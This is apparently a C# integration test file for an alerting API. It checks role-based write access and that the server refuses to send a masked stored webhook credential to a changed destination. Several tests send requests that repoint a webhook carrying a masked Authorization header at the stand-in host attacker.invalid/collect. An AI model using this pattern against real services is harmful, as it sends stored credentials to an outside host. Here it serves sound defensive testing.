using System.Net;
using System.Net.Http.Json;
using System.Text.Json;

namespace Ameto.Integration.Tests;

/// <summary>
/// Two things guard the alert surface, and both are load-bearing.
///
/// <para>The first is who may write a rule. A rule owns its channels, and a channel holds a
/// credential and names the host the server will dial — so rule writes are admin-only, while
/// reads stay open to any signed-in user and the operational verbs (silences, maintenance,
/// acknowledgement) sit with manager.</para>
///
/// <para>The second is what a write may change. Responses redact every secret to
/// <c>********</c> and an upsert echoing that sentinel back means "unchanged", so the stored
/// value is merged in. That merge is only sound while the destination stays put: change the URL
/// and keep the mask, and the server would resolve the stored credential and hand it to
/// whoever asked. These tests pin the refusal.</para>
/// </summary>
public sealed class AlertAuthorizationTests : IClassFixture<AmetoWebAppFactory>
{
    private readonly AmetoWebAppFactory _factory;
    public AlertAuthorizationTests(AmetoWebAppFactory factory) => _factory = factory;

    private HttpClient ClientAs(string role)
    {
        var client = _factory.CreateClient();
        client.DefaultRequestHeaders.Add(TestAuthHandler.RoleHeader, role);
        return client;
    }

    /// <summary>Creates a rule with one webhook channel carrying a secret header. Returns its id.</summary>
    private static async Task<string> CreateWebhookRuleAsync(HttpClient admin, string url, string headerValue)
    {
        var resp = await admin.PostAsJsonAsync("/api/alerts", new
        {
            name       = "secret-carrier",
            source     = "Log",
            threshold  = 1.0,
            channels   = new[]
            {
                new { type = "webhook", url, headers = new Dictionary<string, string> { ["Authorization"] = headerValue } },
            },
        });
        resp.EnsureSuccessStatusCode();

        using var doc = JsonDocument.Parse(await resp.Content.ReadAsStringAsync());
        return doc.RootElement.GetProperty("id").GetString()!;
    }

    // ── Who may write ─────────────────────────────────────────────────────────

    [Fact]
    public async Task Viewer_CannotCreateARule()
    {
        var resp = await ClientAs("viewer").PostAsJsonAsync("/api/alerts", new
        {
            name     = "viewer-attempt",
            channels = new[] { new { type = "webhook", url = "http://attacker.invalid/" } },
        });

        Assert.Equal(HttpStatusCode.Forbidden, resp.StatusCode);
    }

    [Fact]
    public async Task Manager_CannotWriteARuleButMaySilence()
    {
        var manager = ClientAs("manager");

        var write = await manager.PostAsJsonAsync("/api/alerts",
            new { name = "manager-attempt", channels = Array.Empty<object>() });
        Assert.Equal(HttpStatusCode.Forbidden, write.StatusCode);

        // Operational verbs remain available to manager.
        var silence = await manager.PostAsJsonAsync("/api/alerts/silences",
            new { ruleId = "does-not-exist", minutes = 5, reason = "test" });
        Assert.Equal(HttpStatusCode.OK, silence.StatusCode);
    }

    [Fact]
    public async Task Viewer_CanStillReadAlertState()
    {
        var resp = await ClientAs("viewer").GetAsync("/api/alerts/state");
        Assert.Equal(HttpStatusCode.OK, resp.StatusCode);
    }

    // ── What a write may change ───────────────────────────────────────────────

    [Fact]
    public async Task Upsert_RefusesAMaskedSecretAimedAtANewDestination()
    {
        var admin = ClientAs("admin");
        var id    = await CreateWebhookRuleAsync(admin, "https://hooks.internal.invalid/ops", "Bearer real-token");

        // Read it back the way a client would: the header value comes back masked.
        var stored = await admin.GetFromJsonAsync<JsonElement>($"/api/alerts/{id}");
        var maskedHeader = stored.GetProperty("channels")[0].GetProperty("headers").GetProperty("Authorization").GetString();
        Assert.Equal("********", maskedHeader);

        // Now keep the mask but move the destination — the exfiltration shape.
        var resp = await admin.PutAsJsonAsync($"/api/alerts/{id}", new
        {
            name     = "secret-carrier",
            channels = new[]
            {
                new
                {
                    type    = "webhook",
                    url     = "http://attacker.invalid/collect",
                    headers = new Dictionary<string, string> { ["Authorization"] = "********" },
                },
            },
        });

        Assert.Equal(HttpStatusCode.BadRequest, resp.StatusCode);
        Assert.Contains("masked", await resp.Content.ReadAsStringAsync(), StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task Test_RefusesAMaskedSecretAimedAtANewDestination()
    {
        var admin = ClientAs("admin");
        var id    = await CreateWebhookRuleAsync(admin, "https://hooks.internal.invalid/ops2", "Bearer real-token");

        // /test is the sharper edge of the same flaw: no persistence needed, the
        // credential is spent immediately against whatever host the payload names.
        var resp = await admin.PostAsJsonAsync("/api/alerts/test", new
        {
            id,
            name     = "secret-carrier",
            channels = new[]
            {
                new
                {
                    type    = "webhook",
                    url     = "http://attacker.invalid/collect",
                    headers = new Dictionary<string, string> { ["Authorization"] = "********" },
                },
            },
        });

        Assert.Equal(HttpStatusCode.BadRequest, resp.StatusCode);
    }

    [Fact]
    public async Task Upsert_KeepsAMaskedSecretWhenTheDestinationIsUnchanged()
    {
        var admin = ClientAs("admin");
        const string url = "https://hooks.internal.invalid/keepme";
        var id = await CreateWebhookRuleAsync(admin, url, "Bearer real-token");

        // Same destination, mask echoed back: the ordinary "edit the name" round-trip.
        var resp = await admin.PutAsJsonAsync($"/api/alerts/{id}", new
        {
            name     = "renamed",
            channels = new[]
            {
                new { type = "webhook", url, headers = new Dictionary<string, string> { ["Authorization"] = "********" } },
            },
        });

        Assert.Equal(HttpStatusCode.OK, resp.StatusCode);

        // The secret survived the round-trip rather than being written away as "********".
        var after = await admin.GetFromJsonAsync<JsonElement>($"/api/alerts/{id}");
        Assert.Equal("renamed", after.GetProperty("name").GetString());
        Assert.Equal("********",
            after.GetProperty("channels")[0].GetProperty("headers").GetProperty("Authorization").GetString());
    }

    [Fact]
    public async Task Upsert_AllowsANewDestinationWhenTheSecretIsSuppliedAgain()
    {
        var admin = ClientAs("admin");
        var id    = await CreateWebhookRuleAsync(admin, "https://hooks.internal.invalid/moveme", "Bearer real-token");

        // Re-entering the secret is what makes moving the channel legitimate.
        var resp = await admin.PutAsJsonAsync($"/api/alerts/{id}", new
        {
            name     = "secret-carrier",
            channels = new[]
            {
                new
                {
                    type    = "webhook",
                    url     = "https://hooks.internal.invalid/elsewhere",
                    headers = new Dictionary<string, string> { ["Authorization"] = "Bearer a-different-token" },
                },
            },
        });

        Assert.Equal(HttpStatusCode.OK, resp.StatusCode);
    }
}
